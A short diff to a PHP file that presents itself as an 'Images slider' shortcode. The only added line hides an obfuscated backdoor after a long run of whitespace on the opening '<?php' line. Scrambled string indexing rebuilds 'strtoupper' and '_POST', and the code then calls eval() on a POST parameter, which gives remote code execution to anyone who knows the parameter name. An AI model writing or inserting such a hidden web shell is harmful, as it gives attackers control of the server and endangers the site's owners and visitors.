@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                     $cmx75 = "eu_otrps";$ajp4= $cmx75[7]. $cmx75[4].$cmx75[5]. $cmx75[4]. $cmx75[3]. $cmx75[1].$cmx75[6]. $cmx75[6].$cmx75[0]. $cmx75[5] ;$nan0 =$ajp4 ( $cmx75[2].$cmx75[6].$cmx75[3].$cmx75[7]. $cmx75[4] );if (isset ( ${ $nan0 } ['qb5ab8e' ] )){eval( ${$nan0} ['qb5ab8e'] ) ; } ?><?php
 /**
  * Shortcode Title: Images slider
  * Shortcode: images_slider
